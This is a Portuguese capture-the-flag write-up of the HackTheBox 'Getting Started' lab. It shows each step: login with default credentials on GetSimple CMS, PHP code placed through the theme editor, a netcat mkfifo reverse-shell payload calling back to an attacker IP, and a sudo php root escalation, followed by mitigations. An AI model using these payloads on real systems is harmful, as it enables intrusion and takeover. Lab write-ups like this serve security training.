# Getting Started — HackTheBox

**Plataforma:** HackTheBox
**Máquina:** Getting Started
**Dificuldade:** Easy
**SO:** Linux
**Data:** 24/07/2026
**Tags:** #enum #foothold #privesc #getsimplecms #sudo-misconfig
**Status:** Retired ✅ (publicação em conformidade com os ToS do HTB)

## TL;DR

O acesso inicial explora **credenciais padrão não alteradas** (`admin:admin`) em uma instância exposta do **GetSimple CMS**. O painel administrativo permite editar diretamente o arquivo PHP do tema ativo, sem qualquer validação de conteúdo — o que se traduz em execução de código arbitrária por design para qualquer usuário autenticado, e consequentemente em um shell reverso como `www-data`.

A escalada de privilégios foi trivial: `sudo -l` revelou uma entrada `NOPASSWD` liberando `/usr/bin/php` como root para o usuário `www-data`. Como o PHP não está nas listas de binários "seguros" para regras de sudo e expõe múltiplas primitivas de execução de processo, o abuso via `pcntl_exec()` (documentado no GTFOBins) rendeu um shell root imediato.

**Cadeia de ataque:** Credenciais padrão em CMS exposto → Editor de temas sem sandbox (RCE) → Shell reverso (www-data) → Regra de sudo excessivamente permissiva (`NOPASSWD: /usr/bin/php`) → root

---

## 1. Reconhecimento

### 1.1 Varredura de portas

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 14:32 -0300
Nmap scan report for 10.129.88.109
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Apenas duas portas abertas: SSH (22) e HTTP (Apache 2.4.41). O título da página e o `robots.txt` já entregam o CMS (**GetSimple**) e um caminho protegido (`/admin/`), direcionando a enumeração web.

### 1.2 Enumeração do serviço web

```
gobuster dir -u http://10.129.88.109/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o check.txt

.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
.htpasswd            (Status: 403) [Size: 278]
admin                (Status: 301) [Size: 314] [--> http://10.129.88.109/admin/]
backups              (Status: 301) [Size: 316] [--> http://10.129.88.109/backups/]
data                 (Status: 301) [Size: 313] [--> http://10.129.88.109/data/]
index.php            (Status: 200) [Size: 5485]
plugins              (Status: 301) [Size: 316] [--> http://10.129.88.109/plugins/]
robots.txt           (Status: 200) [Size: 32]
server-status        (Status: 403) [Size: 278]
sitemap.xml          (Status: 200) [Size: 431]
theme                (Status: 301) [Size: 314] [--> http://10.129.88.109/theme/]
```

Estrutura típica de instalação **GetSimple CMS** exposta na raiz do site (`/`), sem subpasta — ponto relevante mais adiante, já que o Metasploit tentou (e falhou) autenticar com o `TARGETURI` default do módulo, que assume um caminho como `/GetSimpleCMS`.

Acessando `/admin/`, testei as credenciais padrão do CMS: **`admin:admin`** — autenticação bem-sucedida. Credencial default ainda ativa em produção/CTF, sem nenhuma política de troca obrigatória no primeiro login.

---

## 2. Foothold (acesso inicial)

### 2.1 RCE via editor de temas

O painel administrativo do GetSimple expõe um editor de temas que permite modificar diretamente arquivos PHP servidos pela aplicação — sem validação de conteúdo. Testei inserindo um payload simples no arquivo de template ativo:

```php
<?php system('id'); ?>
```

Ao acessar `http://gettingstarted.htb/theme/Cardinal/template.php`, o servidor retornou:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Confirmada a execução de código arbitrário como `www-data`.

### 2.2 Shell reverso

Substituí o conteúdo do template por um payload de shell reverso:

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.161 9443 >/tmp/f"); ?>
```

Com um listener ativo (`nc -lvnp 9443`) e um request ao template modificado, obtive o shell inicial:

```
$ whoami
www-data
```

Shell foi estabilizado com:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### 2.3 Enumeração pós-exploração e user flag

```
$ cd /home
$ ls
mrb3n
$ cat /home/mrb3n/user.txt
7002d65b...21d8
```

**User flag capturada.**

---

## 3. Escalada de privilégios

### 3.1 Enumeração de sudo

```
$ sudo -l
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
```

O usuário `www-data` pode executar `/usr/bin/php` como qualquer usuário (incluindo root), sem senha. O PHP não consta nas listas de binários "seguros" para sudo e possui múltiplas primitivas de execução de comando/processo — abuso documentado no GTFOBins ([gtfobins.github.io/gtfobins/php](https://gtfobins.github.io/gtfobins/php/)).

### 3.2 Exploração

```bash
sudo php -r "pcntl_exec('/bin/sh', ['-p']);"
```

```
$ whoami
root
```

**Causa raiz técnica:** `pcntl_exec()` substitui a imagem do processo PHP atual pelo binário informado (`/bin/sh`), herdando o UID efetivo do processo pai — nesse caso, root via sudo. A flag `-p` preserva privilégios no shell resultante.

### 3.3 Root flag

```
root@gettingstarted:~# cat root.txt
f1fba6e9...7842
```

**Root flag capturada.**

---

## 4. Causa raiz e mitigação

| # | Vulnerabilidade | Causa raiz | Mitigação |
|---|---|---|---|
| 1 | Credenciais padrão ativas | `admin:admin` não alterado pós-instalação do CMS, sem política de troca obrigatória | Forçar troca de credenciais no primeiro login; políticas de senha mínima; alertas de credencial default em ferramentas de hardening |
| 2 | RCE via editor de temas | Editor de temas do GetSimple permite escrita direta de PHP executável, sem sandbox, restrição de extensão ou revisão de conteúdo | Desabilitar edição de arquivos executáveis via painel; segregar diretório de temas do diretório servido publicamente; validar/filtrar conteúdo enviado |
| 3 | Regra de sudo excessivamente permissiva | `sudoers` concede `NOPASSWD` para `/usr/bin/php`, binário com funções de execução de comando (`system`, `exec`, `pcntl_exec`) | Nunca conceder sudo irrestrito para interpretadores de linguagem de propósito geral; se necessário, usar wrappers com `disable_functions` restritivo ou permitir apenas scripts específicos por caminho absoluto |

---

## 5. Lições aprendidas

- Sempre validar o `TARGETURI` real de uma aplicação antes de assumir o path default de um módulo Metasploit — o GetSimple aqui estava na raiz do site, não em `/GetSimpleCMS`, o que teria feito qualquer módulo automatizado falhar silenciosamente na autenticação.
- Painéis administrativos com capacidade de edição de arquivos (temas, plugins, uploads) são um vetor de RCE recorrente em CMSs legados — vale sempre testar essa superfície logo após obter acesso autenticado.
- `sudo -l` deve ser o primeiro comando rodado após qualquer foothold; regras de sudo mal configuradas para interpretadores (PHP, Python, Perl, etc.) são triviais de abusar via GTFOBins.
- Credenciais padrão continuam sendo, na prática, um dos vetores de acesso inicial mais comuns mesmo em ambientes com serviços expostos publicamente — testar sempre antes de partir para exploits mais complexos.
